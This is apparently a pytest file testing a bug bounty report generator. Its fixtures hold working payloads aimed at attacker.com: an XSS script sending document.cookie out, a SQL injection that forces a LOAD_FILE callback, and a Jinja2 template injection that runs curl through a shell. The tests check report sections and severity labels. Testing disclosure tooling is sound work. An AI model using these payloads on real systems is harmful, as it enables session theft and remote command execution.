"""Tests for bug bounty report generation."""

import json
import time

import pytest

from ricochet.output.finding import Finding
from ricochet.reporting import ReportGenerator, generate_report


@pytest.fixture
def xss_finding_with_metadata():
    """XSS finding with captured metadata."""
    metadata = {
        'url': 'https://example.com/admin/tickets',
        'cookies': 'session=abc123; PHPSESSID=xyz789',
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'dom': '<div class="ticket"><p>User feedback here</p></div>',
    }

    return Finding(
        correlation_id='abc123def456abcd',
        target_url='https://example.com/feedback',
        parameter='message',
        payload='<script>fetch("http://attacker.com/abc123def456abcd?c="+document.cookie)</script>',
        context='xss:html:exfil',
        injected_at=1706000000,
        callback_id=1,
        source_ip='10.0.0.5',
        request_path='/abc123def456abcd?c=session%3Dabc123',
        callback_headers={'User-Agent': 'Mozilla/5.0'},
        callback_body=json.dumps(metadata).encode(),
        received_at=1706007200,
        delay_seconds=7200,  # 2 hours
    )


@pytest.fixture
def xss_finding_no_metadata():
    """XSS finding without metadata (simple callback)."""
    return Finding(
        correlation_id='simple123456',
        target_url='https://example.com/comment',
        parameter='text',
        payload='<img src=x onerror="fetch(\'http://attacker.com/simple123456\')">',
        context='xss:html',
        injected_at=1706000000,
        callback_id=2,
        source_ip='10.0.0.5',
        request_path='/simple123456',
        callback_headers={},
        callback_body=None,
        received_at=1706000030,
        delay_seconds=30,
    )


@pytest.fixture
def sqli_finding():
    """SQL injection finding (out-of-band)."""
    return Finding(
        correlation_id='sqli789xyz',
        target_url='https://example.com/search',
        parameter='query',
        payload="' OR 1=1; SELECT LOAD_FILE(CONCAT('\\\\\\\\', 'sqli789xyz', '.attacker.com\\\\'))--",
        context='sqli:oob',
        injected_at=1706000000,
        callback_id=3,
        source_ip='192.168.1.10',
        request_path='/sqli789xyz',
        callback_headers={},
        callback_body=None,
        received_at=1706000005,
        delay_seconds=5,
    )


@pytest.fixture
def ssti_finding():
    """SSTI finding."""
    return Finding(
        correlation_id='ssti456abc',
        target_url='https://example.com/template',
        parameter='name',
        payload='{{ "".__class__.__mro__[1].__subclasses__()[396]("curl http://attacker.com/ssti456abc", shell=True) }}',
        context='ssti:jinja2',
        injected_at=1706000000,
        callback_id=4,
        source_ip='172.16.0.5',
        request_path='/ssti456abc',
        callback_headers={'User-Agent': 'curl/7.68.0'},
        callback_body=None,
        received_at=1706000002,
        delay_seconds=2,
    )


def test_report_generator_xss_with_metadata(xss_finding_with_metadata):
    """Test report generation for XSS with metadata."""
    generator = ReportGenerator(xss_finding_with_metadata)
    report = generator.generate()

    # Check required sections exist
    assert '## Summary' in report
    assert '## Severity' in report
    assert '## Description' in report
    assert '## Steps to Reproduce' in report
    assert '## Proof of Concept' in report
    assert '## Captured Metadata' in report
    assert '## Impact' in report
    assert '## Remediation' in report
    assert '## References' in report

    # Check content accuracy
    assert 'XSS' in report
    assert 'message' in report
    assert 'https://example.com/feedback' in report
    assert 'abc123def456abcd' in report
    assert '7200.0 seconds' in report or '7200 seconds' in report

    # Check metadata was included
    assert 'admin/tickets' in report
    assert 'session=abc123' in report
    assert 'Mozilla/5.0' in report

    # Check severity reasoning
    assert 'MEDIUM' in report
    assert 'stored vulnerability' in report or 'admin context' in report


def test_report_generator_xss_no_metadata(xss_finding_no_metadata):
    """Test report generation for XSS without metadata."""
    generator = ReportGenerator(xss_finding_no_metadata)
    report = generator.generate()

    # Check required sections
    assert '## Summary' in report
    assert '## Proof of Concept' in report

    # Check no metadata note
    assert 'No metadata was captured' in report or 'no metadata' in report.lower()

    # Check content
    assert 'simple123456' in report
    assert 'comment' in report


def test_report_generator_sqli(sqli_finding):
    """Test report generation for SQL injection."""
    generator = ReportGenerator(sqli_finding)
    report = generator.generate()

    # Check it uses SQL injection template
    assert 'SQL' in report or 'sql' in report.lower()
    assert 'database' in report.lower()

    # Check required sections
    assert '## Summary' in report
    assert '## Impact' in report
    assert 'CWE-89' in report

    # Check content
    assert 'sqli789xyz' in report
    assert 'query' in report
    assert 'HIGH' in report


def test_report_generator_ssti(ssti_finding):
    """Test report generation for SSTI."""
    generator = ReportGenerator(ssti_finding)
    report = generator.generate()

    # Check it uses SSTI template
    assert 'Template Injection' in report or 'SSTI' in report
    assert 'template' in report.lower()

    # Check required sections
    assert '## Summary' in report
    assert '## Impact' in report
    assert 'CWE-94' in report

    # Check content
    assert 'ssti456abc' in report
    assert 'name' in report
    assert 'HIGH' in report


def test_generate_report_convenience_function(xss_finding_with_metadata):
    """Test the convenience function wrapper."""
    report = generate_report(xss_finding_with_metadata)

    # Should produce same result as ReportGenerator
    assert isinstance(report, str)
    assert len(report) > 100
    assert '## Summary' in report
    assert 'abc123def456abcd' in report


def test_report_contains_poc_details(xss_finding_with_metadata):
    """Test that report includes detailed PoC information."""
    report = generate_report(xss_finding_with_metadata)

    # Check PoC section has all details
    assert 'Correlation ID' in report
    assert 'Injection Point' in report
    assert 'Payload Used' in report
    assert 'Callback Received' in report
    assert 'Delay:' in report


def test_report_severity_reasoning(xss_finding_with_metadata):
    """Test severity reasoning is included."""
    report = generate_report(xss_finding_with_metadata)

    # Should have reasoning
    assert 'MEDIUM' in report
    # Should mention one of: stored, admin context, cookies
    has_reasoning = (
        'stored' in report.lower() or
        'admin' in report.lower() or
        'cookie' in report.lower()
    )
    assert has_reasoning


def test_report_execution_context_inference(xss_finding_with_metadata):
    """Test execution context is inferred from metadata."""
    generator = ReportGenerator(xss_finding_with_metadata)
    context = generator._infer_execution_context()

    # Should detect admin context from URL
    assert 'admin' in context.lower()


def test_report_execution_context_from_delay(xss_finding_no_metadata):
    """Test execution context inferred from long delay."""
    # Modify to have very long delay
    finding = Finding(
        correlation_id='delayed123',
        target_url='https://example.com/comment',
        parameter='text',
        payload='<script>fetch("http://cb/delayed123")</script>',
        context='xss:html',
        injected_at=1706000000,
        callback_id=5,
        source_ip='10.0.0.5',
        request_path='/delayed123',
        callback_headers={},
        callback_body=None,
        received_at=1706007200,  # 2 hours later
        delay_seconds=7200,
    )

    generator = ReportGenerator(finding)
    context = generator._infer_execution_context()

    # Should mention long delay or admin queue
    assert 'long delay' in context.lower() or 'queue' in context.lower()


def test_template_selection():
    """Test that correct templates are selected based on context."""
    # XSS context
    xss_finding = Finding(
        correlation_id='test1',
        target_url='https://example.com/test',
        parameter='p',
        payload='payload',
        context='xss:html',
        injected_at=time.time(),
        callback_id=1,
        source_ip='127.0.0.1',
        request_path='/test1',
        callback_headers={},
        callback_body=None,
        received_at=time.time(),
        delay_seconds=1,
    )
    gen = ReportGenerator(xss_finding)
    template = gen._select_template()
    assert 'XSS' in template

    # SQLi context
    sqli_finding = Finding(
        correlation_id='test2',
        target_url='https://example.com/test',
        parameter='p',
        payload='payload',
        context='sqli:oob',
        injected_at=time.time(),
        callback_id=2,
        source_ip='127.0.0.1',
        request_path='/test2',
        callback_headers={},
        callback_body=None,
        received_at=time.time(),
        delay_seconds=1,
    )
    gen = ReportGenerator(sqli_finding)
    template = gen._select_template()
    assert 'SQL' in template

    # SSTI context
    ssti_finding = Finding(
        correlation_id='test3',
        target_url='https://example.com/test',
        parameter='p',
        payload='payload',
        context='ssti:jinja2',
        injected_at=time.time(),
        callback_id=3,
        source_ip='127.0.0.1',
        request_path='/test3',
        callback_headers={},
        callback_body=None,
        received_at=time.time(),
        delay_seconds=1,
    )
    gen = ReportGenerator(ssti_finding)
    template = gen._select_template()
    assert 'Template Injection' in template
